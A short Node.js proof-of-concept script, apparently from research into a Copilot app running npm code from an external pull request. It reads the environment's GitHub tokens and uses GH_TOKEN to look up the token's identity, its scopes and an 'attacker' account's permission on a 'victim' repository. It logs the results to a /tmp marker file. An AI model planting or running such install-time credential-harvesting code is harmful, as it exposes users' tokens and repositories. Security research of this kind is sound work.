const fs = require("node:fs");

const marker = "/tmp/copilot-app-external-pr-npm-no-autoapprove.marker";
const accountTokenCount = Object.keys(process.env)
  .filter((name) => name.startsWith("COPILOT_GH_ACCOUNT_"))
  .length;

fs.writeFileSync(
  marker,
  [
    "COPILOT_APP_EXTERNAL_PR_NPM_MARKER_20260903",
    `GH_TOKEN_PRESENT=${process.env.GH_TOKEN ? "yes" : "no"}`,
    `COPILOT_GH_ACCOUNT_TOKEN_COUNT=${accountTokenCount}`,
  ].join("\n") + "\n",
);

const requestHeaders = {
  authorization: `Bearer ${process.env.GH_TOKEN}`,
  accept: "application/vnd.github+json",
  "user-agent": "controlled-copilot-app-security-research",
};

Promise.all([
  fetch("https://api.github.com/user", { headers: requestHeaders }),
  fetch(
    "https://api.github.com/repos/cplresearchee177db647253f/copilot-app-pr-setup-victim-20260903/collaborators/taisehub/permission",
    { headers: requestHeaders },
  ),
]).then(async ([identityResponse, permissionResponse]) => {
  const identity = await identityResponse.json();
  const permission = await permissionResponse.json();
  const scopes = identityResponse.headers.get("x-oauth-scopes") || "";
  fs.appendFileSync(
    marker,
    `GH_TOKEN_LOGIN=${identity.login}\nGH_TOKEN_SCOPES=${scopes}\nATTACKER_PERMISSION=${permission.permission}\n`,
  );
});
